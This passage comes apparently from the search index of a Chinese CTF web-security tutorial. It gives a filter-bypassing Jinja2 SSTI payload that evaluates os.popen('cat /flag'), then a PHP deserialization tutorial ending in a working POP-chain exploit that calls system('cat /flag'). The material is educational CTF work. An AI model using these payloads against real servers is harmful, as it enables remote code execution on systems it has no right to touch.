<p>\u901a\u8fc7\u4e0a\u8ff0\u539f\u7406\uff0c\u6211\u4eec\u53ef\u4ee5\u4f9d\u6b21\u83b7\u5f97\u6784\u9020payload\u6240\u9700\u7684\u7279\u6b8a\u5b57\u7b26\u4e0e\u5b57\u7b26\u4e32\uff1a</p> <pre><code># \u9996\u5148\u6784\u9020\u51fa\u6240\u9700\u7684\u6570\u5b57:\n{% set zero = (({ }|select|string|list).pop(38)|int) %}    # 0\n{% set one = (zero**zero)|int %}    # 1\n{% set two = (zero-one-one)|abs %}    # 2\n{% set four = (two*two)|int %}    # 4\n{% set five = (two*two*two)-one-one-one %}    # 5\n{% set seven = (zero-one-one-five)|abs %}    # 7\n\n# \u6784\u9020\u51fa\u6240\u9700\u7684\u5404\u79cd\u5b57\u7b26\u4e0e\u5b57\u7b26\u4e32:\n{% set xhx = (({ }|select|string|list).pop(24)|string) %}    # _\n{% set space = (({ }|select|string|list).pop(10)|string) %}    # \u7a7a\u683c\n{% set point = ((app.__doc__|string|list).pop(26)|string) %}    # .\n{% set yin = ((app.__doc__|string|list).pop(195)|string) %}    # \u5355\u5f15\u53f7 '\n{% set left = ((app.__doc__|string|list).pop(189)|string) %}    # \u5de6\u62ec\u53f7 (\n{% set right = ((app.__doc__|string|list).pop(200)|string) %}    # \u53f3\u62ec\u53f7 )\n\n{% set c = dict(c=aa)|reverse|first %}    # \u5b57\u7b26 c\n{% set bfh = self|string|urlencode|first %}    # \u767e\u5206\u53f7 %\n{% set bfhc=bfh~c %}    # \u8fd9\u91cc\u6784\u9020\u4e86%c, \u4e4b\u540e\u53ef\u4ee5\u5229\u7528\u8fd9\u4e2a%c\u6784\u9020\u4efb\u610f\u5b57\u7b26\u3002~\u7528\u4e8e\u5b57\u7b26\u8fde\u63a5\n{% set slas = bfhc%((four~seven)|int) %}    # \u4f7f\u7528%c\u6784\u9020\u659c\u6760 /\n{% set but = dict(buil=aa,tins=dd)|join %}    # builtins\n{% set imp = dict(imp=aa,ort=dd)|join %}    # import\n{% set pon = dict(po=aa,pen=dd)|join %}    # popen\n{% set os = dict(o=aa,s=dd)|join %}    # os\n{% set ca = dict(ca=aa,t=dd)|join %}    # cat\n{% set flg = dict(fl=aa,ag=dd)|join %}    # flag\n{% set ev = dict(ev=aa,al=dd)|join %}    # eval\n{% set red = dict(re=aa,ad=dd)|join %}    # read\n{% set bul = xhx*2~but~xhx*2 %}    # __builtins__\n</code></pre> <p>\u5c06\u4e0a\u9762\u6784\u9020\u7684\u5b57\u7b26\u6216\u5b57\u7b26\u4e32\u62fc\u63a5\u8d77\u6765\u6784\u9020\u51fa <code>__import__('os').popen('cat /flag').read()</code>\uff1a</p> <pre><code>{% set pld = xhx*2~imp~xhx*2~left~yin~os~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right %}\n</code></pre> <p>\u7136\u540e\u5c06\u4e0a\u9762\u6784\u9020\u7684\u5404\u79cd\u53d8\u91cf\u6dfb\u52a0\u5230SSTI\u4e07\u80fdpayload\u91cc\u9762\u5c31\u884c\u4e86\uff1a</p> <pre><code>{% for f,v in whoami.__init__.__globals__.items() %}    # globals\n    {% if f == bul %} \n        {% for a,b in v.items() %}    # builtins\n            {% if a == ev %}    # eval\n                {{b(pld)}}    # eval(\"__import__('os').popen('cat /flag').read()\")\n            {% endif %}\n        {% endfor %}\n    {% endif %}\n{% endfor %}\n</code></pre> <p>\u6240\u4ee5\u6700\u7ec8\u7684payload\u4e3a\uff1a</p> <p><pre><code>{% set zero = (({ }|select|string|list).pop(38)|int) %}{% set one = (zero**zero)|int %}{% set two = (zero-one-one)|abs|int %}{% set four = (two*two)|int %}{% set five = (two*two*two)-one-one-one %}{% set seven = (zero-one-one-five)|abs %}{% set xhx = (({ }|select|string|list).pop(24)|string) %}{% set space = (({ }|select|string|list).pop(10)|string) %}{% set point = ((app.__doc__|string|list).pop(26)|string) %}{% set yin = ((app.__doc__|string|list).pop(195)|string) %}{% set left = ((app.__doc__|string|list).pop(189)|string) %}{% set right = ((app.__doc__|string|list).pop(200)|string) %}{% set c = dict(c=aa)|reverse|first %}{% set bfh=self|string|urlencode|first %}{% set bfhc=bfh~c %}{% set slas = bfhc%((four~seven)|int) %}{% set but = dict(buil=aa,tins=dd)|join %}{% set imp = dict(imp=aa,ort=dd)|join %}{% set pon = dict(po=aa,pen=dd)|join %}{% set os = dict(o=aa,s=dd)|join %}{% set ca = dict(ca=aa,t=dd)|join %}{% set flg = dict(fl=aa,ag=dd)|join %}{% set ev = dict(ev=aa,al=dd)|join %}{% set red = dict(re=aa,ad=dd)|join %}{% set bul = xhx*2~but~xhx*2 %}{% set pld = xhx*2~imp~xhx*2~left~yin~os~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right %}{% for f,v in whoami.__init__.__globals__.items() %}{% if f == bul %}{% for a,b in v.items() %}{% if a == ev %}{{b(pld)}}{% endif %}{% endfor %}{% endif %}{% endfor %}\n</code></pre> \u53c2\u8003</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-SSTI%E7%AF%87/#django","title":"Django","text":""},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-SSTI%E7%AF%87/#php","title":"Php","text":""},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-SSTI%E7%AF%87/#smarty","title":"smarty","text":""},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-SSTI%E7%AF%87/#twig","title":"Twig","text":""},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-XSS%E7%AF%87/","title":"XSS","text":"<p> \u7ea6 3 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4\u4e0d\u5230 1 \u5206\u949f</p> <p>\u6316\u5751</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87/","title":"\u53cd\u5e8f\u5217\u5316","text":"<p> \u7ea6 2788 \u4e2a\u5b57  495 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 15 \u5206\u949f</p> <p>Note</p> <p>\u5e8f\u5217\u5316/\u53cd\u5e8f\u5217\u5316\u662f\u5bf9\u5bf9\u8c61\u7684\u64cd\u4f5c\uff0c\u5b66\u4e60\u524d\u5148\u4e86\u89e3\u4e00\u4e0b\u9762\u5411\u5bf9\u8c61</p> <p>\u76ee\u524d\u53ea\u6709PHP\u53cd\u5e8f\u5217\u5316\uff0c\u671f\u5f85\u8865\u5145</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87/#_2","title":"\u6982\u5ff5\u4e0e\u57fa\u7840\u77e5\u8bc6","text":"<p>\u5e8f\u5217\u5316\u5c31\u662f\u5c06\u4e00\u4e2a\u5bf9\u8c61\u8f6c\u6362\u6210\u5b57\u7b26\u4e32\u3002\u5b57\u7b26\u4e32\u5305\u62ec\uff0c\u5c5e\u6027\u540d\uff0c\u5c5e\u6027\u503c\uff0c\u5c5e\u6027\u7c7b\u578b\u548c\u8be5\u5bf9\u8c61\u5bf9\u5e94\u7684\u7c7b\u540d\u3002 \u53cd\u5e8f\u5217\u5316\u5219\u76f8\u53cd\u5c06\u5b57\u7b26\u4e32\u91cd\u65b0\u6062\u590d\u6210\u5bf9\u8c61</p> \u7c7b\u578b \u8fc7\u7a0b \u5e8f\u5217\u5316 \u5bf9\u8c61\u2014&gt; \u5b57\u7b26\u4e32 \u53cd\u5e8f\u5217\u5316 \u5b57\u7b26\u4e32\u2014&gt;\u5bf9\u8c61 <p>\u5bf9\u8c61\u7684\u5e8f\u5217\u5316\u5229\u4e8e\u5bf9\u8c61\u7684 \u4fdd\u5b58\u548c\u4f20\u8f93 \uff0c\u4e5f\u53ef\u4ee5\u8ba9\u591a\u4e2a\u6587\u4ef6\u5171\u4eab\u5bf9\u8c61\u3002</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87/#php","title":"php\u53cd\u5e8f\u5217\u5316","text":"<p>\u6f0f\u6d1e\u89e6\u53d1\u6761\u4ef6\uff1a <code>unserialize</code>\u51fd\u6570\u7684\u53c2\u6570\u3001\u53d8\u91cf\u53ef\u63a7\uff0cphp\u6587\u4ef6\u4e2d\u5b58\u5728\u53ef\u5229\u7528\u7684\u7c7b\uff0c\u7c7b\u4e2d\u6709\u9b54\u672f\u65b9\u6cd5</p>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87/#_3","title":"\u9b54\u672f\u65b9\u6cd5","text":"<p>\u662f\u7528\u6765\u8ba9\u5f00\u53d1\u8005\u80fd\u591f\u62e6\u622a\u6216\u91cd\u8f7dPHP\u7684\u9ed8\u8ba4\u5bf9\u8c61\u884c\u4e3a\uff0c\u63d0\u4f9b\u66f4\u7075\u6d3b\u7684\u5bf9\u8c61\u64cd\u4f5c\u65b9\u5f0f\u3002\u5b83\u4eec\u5141\u8bb8\u4f60\u5728\u5bf9\u8c61\u751f\u547d\u5468\u671f\u4e2d\u7684\u7279\u5b9a\u65f6\u523b\u63d2\u5165\u81ea\u5b9a\u4e49\u903b\u8f91\u3002PHP\u9762\u5411\u5bf9\u8c61\u4e2d\u7279\u6709\u7684\u7279\u6027\u3002\u5b83\u4eec\u5728\u7279\u5b9a\u7684\u60c5\u51b5\u4e0b\u88ab\u89e6\u53d1\uff0c\u90fd\u662f\u4ee5\u53cc\u4e0b\u5212\u7ebf\u5f00\u5934\uff0c\u53ef\u4ee5\u628a\u5b83\u4eec\u7406\u89e3\u4e3a\u94a9\u5b50\u3002</p> <p>\u4e00\u4e9b\u5e38\u89c1\u7684\u9b54\u672f\u65b9\u6cd5</p> <pre><code>__construct()    //\u7528\u4e8e\u5728\u521b\u5efa\u5bf9\u8c61\u65f6\u81ea\u52a8\u89e6\u53d1\u5f53\u4f7f\u7528 new \u5173\u952e\u5b57\u5b9e\u4f8b\u5316\u4e00\u4e2a\u7c7b\u65f6\uff0c\u4f1a\u81ea\u52a8\u8c03\u7528\u8be5\u7c7b\u7684 __construct() \u65b9\u6cd5\n__destruct()     //__destruct() \u7528\u4e8e\u5728\u5bf9\u8c61\u88ab\u9500\u6bc1\u65f6\u81ea\u52a8\u89e6\u53d1\u5bf9\u8c61\u7684\u9500\u6bc1\u5bf9\u8c61\u7684\u5f15\u7528\u8ba1\u6570\u51cf\u5c11\u4e3a\u96f6\u6765\u89e6\u53d1\n__sleep()        //\u5e8f\u5217\u5316serialize() \u51fd\u6570\u4f1a\u68c0\u67e5\u7c7b\u4e2d\u662f\u5426\u5b58\u5728\u4e00\u4e2a\u9b54\u672f\u65b9\u6cd5sleep()\u3002\u5982\u679c\u5b58\u5728\uff0c\u8be5\u65b9\u6cd5\u4f1a\u5148\u88ab\u8c03\u7528\uff0c\u7136\u540e\u624d\u6267\u884c\u5e8f\u5217\u5316\u64cd\u4f5c\u3002\u6b64\u529f\u80fd\u53ef\u4ee5\u7528\u4e8e\u6e05\u7406\u5bf9\u8c61\uff0c\u5e76\u8fd4\u56de\u4e00\u4e2a\u5305\u542b\u5bf9\u8c61\u4e2d\u6240\u6709\u5e94\u88ab\u5e8f\u5217\u5316\u7684\u53d8\u91cf\u540d\u79f0\u7684\u6570\u7ec4\n__wakeup()       //\u7528\u4e8e\u5728\u53cd\u5e8f\u5217\u5316\u5bf9\u8c61\u65f6\u81ea\u52a8\u8c03\u7528unserialize() \u4f1a\u68c0\u67e5\u662f\u5426\u5b58\u5728\u4e00\u4e2a wakeup() \u65b9\u6cd5\uff0c\u5982\u679c\u5b58\u5728\uff0c\u5219\u4f1a\u5148\u8c03\u7528wakeup()\u65b9\u6cd5\n__tostring()     //__tostring() \u5728\u5bf9\u8c61\u88ab\u5f53\u505a\u5b57\u7b26\u4e32\u5904\u7406\u65f6\u81ea\u52a8\u8c03\u7528\u6bd4\u5982echo\u3001==\u3001preg_match()\n__invoke()       //__invoke() \u5728\u5bf9\u8c61\u88ab\u5f53\u505a\u51fd\u6570\u5904\u7406\u65f6\u81ea\u52a8\u8c03\u7528\n__call()         //__call($method, $args) \u5728\u8c03\u7528\u4e00\u4e2a\u4e0d\u5b58\u5728\u7684\u65b9\u6cd5\u65f6\u89e6\u53d1, $args\u662f\u6570\u7ec4\u7684\u5f62\u5f0f\n__callStatic()   //__callStatic() \u5728\u9759\u6001\u8c03\u7528\u6216\u8c03\u7528\u6210\u5458\u5e38\u91cf\u65f6\u4f7f\u7528\u7684\u65b9\u6cd5\u4e0d\u5b58\u5728\u65f6\u89e6\u53d1\n__set()          //__set() \u5728\u7ed9\u4e0d\u5b58\u5728\u7684\u6210\u5458\u5c5e\u6027\u8d4b\u503c\u65f6\u89e6\u53d1\n__isset()        //__isset() \u5728\u5bf9\u4e0d\u53ef\u8bbf\u95ee\u5c5e\u6027\u4f7f\u7528 isset() \u6216empty() \u65f6\u4f1a\u88ab\u89e6\u53d1\n__unset()        //__unset() \u5728\u5bf9\u4e0d\u53ef\u8bbf\u95ee\u5c5e\u6027\u4f7f\u7528 unset() \u65f6\u4f1a\u88ab\u89e6\u53d1\n__clone()        //__clone() \u5f53\u4f7f\u7528 clone \u5173\u952e\u5b57\u62f7\u8d1d\u5b8c\u6210\u4e00\u4e2a\u5bf9\u8c61\u540e\u5c31\u4f1a\u89e6\u53d1 \n__get()          //__get() \u5f53\u5c1d\u8bd5\u8bbf\u95ee\u4e0d\u53ef\u8bbf\u95ee\u5c5e\u6027\u65f6\u4f1a\u88ab\u81ea\u52a8\u8c03\u7528\n</code></pre>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87/#_4","title":"\u5e8f\u5217\u5316\u540e\u7684\u7ed3\u6784","text":"<pre><code>&lt;?php\n$user=array('xiao','shi','zi');\n$user=serialize($user);\necho($user.PHP_EOL);\nprint_r(unserialize($user));\n\n/*\n\u8f93\u51fa\uff1a\na:3:{i:0;s:4:\"xiao\";i:1;s:3:\"shi\";i:2;s:2:\"zi\";}\nArray\n(\n[0] =&gt; xiao\n[1] =&gt; shi\n[2] =&gt; zi\n)\n\na:3:{i:0;s:4:\"xiao\";i:1;s:3:\"shi\";i:2;s:2:\"zi\";}\na:array\u4ee3\u8868\u662f\u6570\u7ec4\uff0c\u540e\u9762\u76843\u8bf4\u660e\u6709\u4e09\u4e2a\u5c5e\u6027\ni:\u4ee3\u8868\u662f\u6574\u578b\u6570\u636eint\uff0c\u540e\u9762\u76840\u662f\u6570\u7ec4\u4e0b\u6807\ns:\u4ee3\u8868\u662f\u5b57\u7b26\u4e32\uff0c\u540e\u9762\u76844\u662f\u56e0\u4e3axiao\u957f\u5ea6\u4e3a4\n\u4f9d\u6b21\u7c7b\u63a8\n</code></pre> <p>\u5e8f\u5217\u5316\u540e\u7684\u5185\u5bb9\u53ea\u6709\u6210\u5458\u53d8\u91cf\u5373\u5c5e\u6027\uff0c\u6ca1\u6709\u6210\u5458\u51fd\u6570</p> <p>\u6bd4\u5982\u4e0b\u9762\u7684\u4f8b\u5b50\uff1a</p> <p>\u5e8f\u5217\u5316\u8f93\u51fa\u4e2d\u53ea\u6709\u5c5e\u6027<code>$a</code>\u548c<code>$b</code>\u7684\u503c\uff0c\u65b9\u6cd5<code>happy()</code>\u548c<code>__construct()</code>\u4e0d\u4f1a\u51fa\u73b0\u5728\u5e8f\u5217\u5316\u6570\u636e\u4e2d</p> <p>\u6240\u4ee5\u5728\u8fdb\u884c\u5e8f\u5217\u5316\u6784\u9020\u5b8cpop\u94fe\u540e\uff0c\u53ef\u4ee5\u5220\u53bb\u6210\u5458\u51fd\u6570\uff0c\u7f29\u77ed\u4ee3\u7801\u957f\u5ea6\uff0c\u4fbf\u4e8e\u68c0\u67e5\u6b63\u786e\u4e0e\u5426</p> <pre><code>&lt;?php\nclass test{\npublic $a;\npublic $b;\nfunction __construct(){$this-&gt;a = \"xiaoshizi\";$this-&gt;b=\"laoshizi\";}\nfunction happy(){return $this-&gt;a;}\n}\n$a = new test();\necho serialize($a);\n?&gt;\n\n/*\n\u8f93\u51fa\uff1a\nO:4:\"test\":2:{s:1:\"a\";s:9:\"xiaoshizi\";s:1:\"b\";s:8:\"laoshizi\";}\n\nO:4:\"test\":2\u4e2d\nO\u4ee3\u8868Object\n4\u4ee3\u8868test\u7684\u957f\u5ea6\ntest\u662f\u7c7b\u7684\u540d\u5b57\n2\u4ee3\u8868\u8fd9\u4e2a\u7c7b\u6709\u4e24\u4e2a\u5c5e\u6027\n\ns:1:\"a\";s:9:\"xiaoshizi\";\n\ns:1:\"a\" - \u5c5e\u6027\u540d\ns \u8868\u793a\u5b57\u7b26\u4e32\u7c7b\u578b\n1 \u8868\u793a\u5b57\u7b26\u4e32\u957f\u5ea6\n\"a\" \u662f\u5c5e\u6027\u540d\ns:9:\"xiaoshizi\" - \u5c5e\u6027\u503c\ns \u8868\u793a\u5b57\u7b26\u4e32\u7c7b\u578b\n9 \u8868\u793a\u5b57\u7b26\u4e32\u957f\u5ea6\n\"xiaoshizi\" \u662f\u5c5e\u6027\u503c\n</code></pre>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87/#_5","title":"\u8bbf\u95ee\u63a7\u5236\u4fee\u9970\u7b26","text":"<p>\u6839\u636e\u8bbf\u95ee\u63a7\u5236\u4fee\u9970\u7b26\u7684\u4e0d\u540c \u5e8f\u5217\u5316\u540e\u7684 \u5c5e\u6027\u957f\u5ea6\u548c\u5c5e\u6027\u503c\u4f1a\u6709\u6240\u4e0d\u540c\uff0c\u6240\u4ee5\u8fd9\u91cc\u7b80\u5355\u63d0\u4e00\u4e0b</p> <pre><code>public(\u516c\u6709) \nprotected(\u53d7\u4fdd\u62a4)     // %00*%00\u5c5e\u6027\u540d\nprivate(\u79c1\u6709\u7684)       // %00\u7c7b\u540d%00\u5c5e\u6027\u540d\n</code></pre> <p>\u800c\u5982\u679c\u53d8\u91cf\u524d\u662f<code>protected</code>\uff0c\u5219\u4f1a\u5728\u53d8\u91cf\u540d\u524d\u52a0\u4e0a\\x00*\\x00,</p> <p><code>private</code>\u5219\u4f1a\u5728\u53d8\u91cf\u540d\u524d\u52a0\u4e0a\\x00\u7c7b\u540d\\x00,</p> <p>\u8f93\u51fa\u65f6\u4e00\u822c\u9700\u8981url\u7f16\u7801\uff0c\u5982\u4e0b\uff1a</p> <pre><code>&lt;?php\nclass test{\nprotected $a;\nprivate $b;\nfunction __construct(){$this-&gt;a = \"xiaoshizi\";$this-&gt;b=\"laoshizi\";}\nfunction happy(){return $this-&gt;a;}\n}\n$a = new test();\necho serialize($a);\necho urlencode(serialize($a));\n?&gt;\n\n/*\n\u8f93\u51fa\uff1a\nO:4:\"test\":2:{s:4:\" * a\";s:9:\"xiaoshizi\";s:7:\" test b\";s:8:\"laoshizi\";}\nO%3A4%3A%22test%22%3A2%3A%7Bs%3A4%3A%22%00%2A%00a%22%3Bs%3A9%3A%22xiaoshizi%22%3Bs%3A7%3A%22%00test%00b%22%3Bs%3A8%3A%22laoshizi%22%3B%7D\n\u5982\u4e0b\nprotected $a;\n\" * a\"\n%22%00%2A%00a%22\n\nprivate $b;\n\" test b\"\n%22%00test%00b%22%\n\n*/\n</code></pre>"},{"location":"WEB/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Web%E4%B9%8B%E8%B7%AF-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87/#pop","title":"POP\u94fe\u6784\u9020","text":"<p>\u9b54\u672f\u65b9\u6cd5\u4f1a\u5728CTF\u88ab\u7528\u6765\u7cbe\u5fc3\u6784\u9020\u80fd\u81ea\u52a8\u89e6\u53d1\u7684\u201c\u94fe\u5b50\u201d\uff0c\u800c\u4e14\u4e00\u822c\u7684CTF\u9898\u76ee\u4e2d\uff0c\u4e0d\u4f1a\u5b58\u5728\u5f88\u591a\u7684\u7c7b\uff0c\u6392\u9664\u8ff7\u60d1\u7c7b\uff0c\u771f\u6b63\u6784\u9020pop\u94fe\u7684\u7c7b\u5f88\u5c11\uff0c\u5ba1\u8ba1\u4ee3\u7801\u7684\u5de5\u4f5c\u91cf\u4e0d\u5927\u3002</p> <p>\u6784\u9020pop\u94fe\u7684\u76ee\u7684\u662f\u83b7\u53d6shell\u6216\u8005\u8bfb\u53d6flag\u3002\u6240\u4ee5\u9996\u5148\u8981\u627e\u5230\u771f\u6b63\u6267\u884c\u547d\u4ee4\u7684\u5730\u65b9\u3002\u7136\u540e\u6839\u636e\u9b54\u672f\u65b9\u6cd5\u8fdb\u884c\u53cd\u63a8\uff0c\u5165\u53e3\u4e00\u822c\u662f\u521b\u5efa\u5bf9\u8c61\u6216\u8005\u9500\u6bc1\u5bf9\u8c61\u65f6\u7684\u9b54\u672f\u65b9\u6cd5<code>__wakeup()</code>\u6216<code>__destruct()</code>\u3002\u786e\u5b9a\u4e86\u5165\u53e3\u4ee5\u53ca\u7ec8\u70b9\uff0c\u4e2d\u95f4\u7684\u94fe\u5b50\u7684\u6784\u9020\u5c31\u4f1a\u6bd4\u8f83\u6e05\u6670\u3002\u603b\u800c\u8a00\u4e4b\uff0c\u9006\u5411\u5206\u6790\uff0c\u6b63\u5411\u6784\u9020</p> <p>\u4f8b\u5b50</p> <pre><code>&lt;?php\nhighlight_file(__FILE__);\nerror_reporting(0);\nclass demo1{\n    public $d1text1;\n    public $d1text2;\n    public function __destruct(){\n        echo $this-&gt;d1text1;\n    }\n}\nclass demo2{\n    public $d2text1;\n    public $d2text2;\n    public function __tostring(){\n        $this-&gt;d2text1-&gt;d1text1();\n    }\n\n}\nclass demo3{\n    public $d3text1;\n    public $d3text2;\n    public function __call($method, $args){\n        eval($this-&gt;d3text1);\n    }\n}\n$a=$_GET['data'];\nunserialize($a);\n?&gt;\n</code></pre> <p>\u53ea\u6709\u4e09\u4e2a\u7c7b\u3002\u6309\u7167\u4e0a\u9762\u7684\u6784\u9020\u601d\u8def</p> <p>\u5148\u627e\u7ec8\u70b9\uff0c\u5728\u7c7b<code>demo3</code>\u4e2d\u5b58\u5728\u4e00\u4e2a\u9b54\u672f\u65b9\u6cd5<code>__call()</code>\uff0c\u5176\u4e2d\u6709\u51fd\u6570<code>eval()</code>\uff0c\u53ef\u4ee5\u7528\u6765\u6267\u884c\u4efb\u610f\u547d\u4ee4\uff0c\u6240\u4ee5\u6211\u4eec\u6700\u7ec8\u5229\u7528\u5230\u8fd9\u91cc\u5c31\u53ef\u4ee5\u4e86\u3002</p> <p>\u518d\u627e\u5165\u53e3\u70b9\uff0c\u4e0a\u9762\u63d0\u5230\u5165\u53e3\u4e00\u822c\u662f<code>__wakeup()</code>,\u6216\u8005<code>__destruct()</code> \u7b49\u53ef\u4ee5\u5728\u53cd\u5e8f\u5217\u5316\u65f6\u81ea\u52a8\u89e6\u53d1\u7684\u9b54\u672f\u65b9\u6cd5\u3002\u5728\u7c7b<code>demo1</code>\u4e2d\u5b58\u5728\u5165\u53e3\u65b9\u6cd5<code>__destruct()</code>\u3002</p> <p>\u6700\u540e\u5c31\u662f\u8981\u5229\u7528\u7c7b<code>demo2</code>\u8fdb\u884c\u94fe\u5b50\u7684\u642d\u5efa\uff0c\u9b54\u672f\u65b9\u6cd5<code>__tostring()</code>\u7684\u89e6\u53d1\u65b9\u5f0f\uff1a\u5728\u5bf9\u8c61\u88ab\u5f53\u505a\u5b57\u7b26\u4e32\u5904\u7406\uff0c\u4f8b\u5982echo\uff0c==\uff0cpreg_match()\u7b49\u51fd\u6570</p> <p>\u5165\u53e3\u51fd\u6570\u4e2d\u5c31\u5b58\u5728</p> <pre><code>public function __destruct(){\n        echo $this-&gt;d1text1;\n</code></pre> <p>\u5982\u679c\u6211\u4eec\u628a<code>$d1text1</code>\u8d4b\u503c\u6210<code>demo2</code>\u5b9e\u4f8b\u5316\u540e\u7684\u5bf9\u8c61\uff0c\u8fd9\u6837\u5c31\u4f1a\u89e6\u53d1\u4e86<code>__tostring()</code>\u8fd9\u4e2a\u65b9\u6cd5\u3002</p> <p>\u7136\u540e\u518d\u628a\u7c7b<code>demo2</code>\u4e2d\u7684<code>$d2text1</code>\u8d4b\u503c\u6210<code>demo3</code>\u5b9e\u4f8b\u5316\u540e\u7684\u5bf9\u8c61</p> <p>\u6211\u4eec\u518d\u770b<code>__call</code>\u7684\u89e6\u53d1\u60c5\u51b5\uff0c\u5728\u8c03\u7528\u4e00\u4e2a\u4e0d\u5b58\u5728\u7684\u65b9\u6cd5\u65f6\u89e6\u53d1</p> <p>\u8fd9\u4e2a\u5730\u65b9\u5728\u7b2c\u4e8c\u4e2a\u7c7b\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0</p> <pre><code>public function __tostring(){\n        $this-&gt;d2text1-&gt;d1text1();\n    }\n</code></pre> <p>\u8c03\u7528\u4e86\u4e00\u4e2a<code>d1text1()</code>\u65b9\u6cd5\uff0c\u8fd9\u4e2a\u65b9\u6cd5\u5e76\u4e0d\u5b58\u5728\uff0c\u5728\u8fd9\u91cc\u4f1a\u89e6\u53d1\u9b54\u672f\u65b9\u6cd5<code>__call()</code>\u3002</p> <p>\u81f3\u6b64pop\u94fe\u5c31\u5df2\u7ecf\u5b8c\u6210\u4e86\u3002</p> <p>\u6d41\u7a0b\u5982\u4e0b\uff1a</p> <p>\u901a\u8fc7<code>unserialize($a);</code>\u53cd\u5e8f\u5217\u5316\u65f6\u89e6\u53d1<code>demo1</code>\u7c7b\u4e2d\u7684<code>__destruct()</code>\u65b9\u6cd5\uff0c\u5b9e\u4f8b\u5316\u4f1a\u6267\u884c<code>echo</code>\u51fd\u6570\uff0c<code>echo</code>\u51fd\u6570\u4f1a\u89e6\u53d1<code>__tostring()</code>\u9b54\u672f\u65b9\u6cd5\uff0c\u5b9e\u4f8b\u5316\u4f1a\u8c03\u7528\u4e0d\u5b58\u5728\u7684<code>d1text1()</code>\u51fd\u6570\uff0c\u4ece\u800c\u89e6\u53d1\u9b54\u672f\u65b9\u6cd5<code>__call()</code>\uff0c\u5bfc\u81f4<code>eval($this-&gt;d3text1);</code>\u51fd\u6570\u7684\u8c03\u7528\uff0c\u4ece\u800c\u6267\u884c\u4efb\u610f\u547d\u4ee4</p> <pre><code>demo1-&gt;demo2-&gt;demo3 \n</code></pre> <p>exp\u5982\u4e0b\uff1a </p> <pre><code>&lt;?php\nhighlight_file(__FILE__);\nerror_reporting(0);\nclass demo1{\n    public $d1text1;\n    public $d1text2;\n    public function __destruct(){\n        echo $this-&gt;d1text1;\n    }\n}\nclass demo2{\n    public $d2text1;\n    public $d2text2;\n    public function __tostring(){\n        $this-&gt;d2text1-&gt;d1text1();\n    }\n\n}\nclass demo3{\n    public $d3text1;\n    public $d3text2;\n    public function __call($method, $args){\n        eval($this-&gt;d3text1);\n    }\n}\n\n$a = new demo1();\n$a-&gt;d1text1 = new demo2();\n$a-&gt;d1text1-&gt;d2text1 = new demo3();\n$a-&gt;d1text1-&gt;d2text1-&gt;d3text1 = 'system(\"cat /flag\");';\necho serialize($a);\n\n?&gt;\n</code></pre> <p>\u6784\u9020\u5b8c\u601d\u8def\u540e\u4e5f\u53ef\u4ee5\u5220\u9664\u6210\u5458\u51fd\u6570\uff0c\u751f\u6210pop\u94fe\uff0c</p> <pre><code>&lt;?php\nhighlight_file(__FILE__);\nerror_reporting(0);\nclass demo1{\n    public $d1text1;\n    public $d1text2;\n}\nclass demo2{\n    public $d2text1;\n    public $d2text2;\n\n}\nclass demo3{\n    // public $d3text1 = 'system(\"cat /flag\")'; // \u76f4\u63a5\u5728\u539f\u4ee3\u7801\u4e2d\u7ed9\u5c5e\u6027\u8d4b\u503c\u66f4\u7b80\u6d01\n    public $d3text1;\n    public $d3text2;\n}\n\n$a = new demo1();\n$a-&gt;d1text1 = new demo2();\n$a-&gt;d1text1-&gt;d2text1 = new demo3();\n$a-&gt;d1text1-&gt;d2text1-&gt;d3text1 = 'system(\"cat /flag\");';\n// $a-&gt;d1text1-&gt;d2text1-&gt;d3text1;\necho serialize($a);\n\n// \u7ed3\u679c\n/*\nO:5:\"demo1\":2:{s:7:\"d1text1\";O:5:\"demo2\":2:{s:7:\"d2text1\";O:5:\"demo3\":2:{s:7:\"d3text1\";s:19:\"system(\"cat 